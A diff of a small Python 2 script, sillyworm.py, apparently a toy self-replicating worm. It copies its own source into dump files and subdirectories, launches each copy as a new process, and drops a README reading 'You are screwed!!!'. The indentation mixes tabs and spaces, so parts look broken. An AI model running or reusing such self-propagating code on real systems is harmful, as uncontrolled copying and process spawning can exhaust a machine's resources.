@@ -2,66 +2,56 @@
 
 import os 
 import thread
+import sys
+from subprocess import Popen
 
 def main():
-	print "My name : "+__file__
-	initialfileexist = initialcheck()
-	if initialfileexist == 0:
+	if initialcheck():
 		attack()
 	else:
 		initsetup()
+                
 
 def initsetup():
-	i = 0
-	while i < 3:
-		nf = "dump"+str(i)+".py"
-		os.system("cat sillyworm.py > "+nf)
-		i += 1
-	i = 0
-	while i < 3:
-		nf = "dump"+str(i)+".py"
-		print "Main creating\n"
-		os.system("python "+nf)
-		i += 1
+    with open('sillyworm.py') as f:
+        sillyworm_contents = f.read()
 
+    for i in range(1,4):
+        filename = 'dump'+str(i)+'.py'
+        with open(filename, 'w') as f:
+            f.write(sillyworm_contents)
+        Popen(['/usr/bin/python', os.path.dirname(os.path.abspath(__file__)) + "/" + filename]).pid
+	
+      
 def attack():
-	print "Running "+os.getcwd()+"/"+os.path.basename(__file__)
-	myfilename = os.path.basename(__file__)
+        myfilename = os.path.basename(__file__)
 	myfilename = myfilename.strip(".py")
 	myfilenumber = int(myfilename.strip("dump"))
-	if myfilenumber != 3:
-		os.system("mkdir "+os.getcwd()+"/"+myfilename)
-		print "Made "+os.getcwd()+"/"+myfilename
+	with open(os.path.basename(__file__)) as f:
+		file_contents = f.read()
+	if myfilenumber != 4:
+		os.makedirs(os.path.dirname(os.path.abspath(__file__))+"/"+myfilename)
+		print "Created directory "+os.getcwd()+"/"+myfilename
 		while myfilenumber != 3:
-			childfilename = "dump"+str(myfilenumber+1)+".py"
-			os.system("cat "+myfilename+".py > ./"+myfilename+"/"+childfilename)
-			print "made child "+myfilename+".py > ./"+myfilename+"/"+childfilename
+			childfilename = "dump"+str(myfilenumber+1)+".py"	
+			with open(os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename, 'w') as f:
+				f.write(file_contents)
+			print "Created file "+myfilename+".py > ./"+myfilename+"/"+childfilename
+			print "Trying to execute " + os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename
 			myfilenumber += 1
-	runchildattack()
-
-def runchildattack():
-	cmd = ""
-	childrentorun = []
-	myfilename = os.path.basename(__file__)
-	myfilename = myfilename.strip(".py")
-	corecurrentdir = "."+os.path.basename(__file__).strip(myfilename+".py")+"/"+myfilename
-	print "I want core = "+corecurrentdir
-	for root, dirs, files in os.walk(".", topdown=False):
-   		for name in files:
-   			cmd = os.path.join(root, name)
-     		if corecurrentdir in cmd:
-     			print cmd
-     			
+			Popen(['/usr/bin/python', os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename]).pid
+		
+		if myfilenumber == 3 and str(myfilenumber) in os.path.basename(__file__):
+			with open(os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + "README.md", 'w') as f:
+				f.write("You are screwed!!!\n")		
+	    			
 def initialcheck():
-	currfile = os.path.basename(__file__)
-	if currfile == "sillyworm.py":
-		return 1
-	else:
-		return 0
+        files = os.listdir(os.path.dirname(os.path.abspath(__file__)))
+	for file in files:
+		if "dump" in file:
+			return True
+	return False
 
-def bashit(cmd):
-	print "Core running : "+cmd
-	os.system(cmd)
 
 if __name__ == "__main__":
 	main()
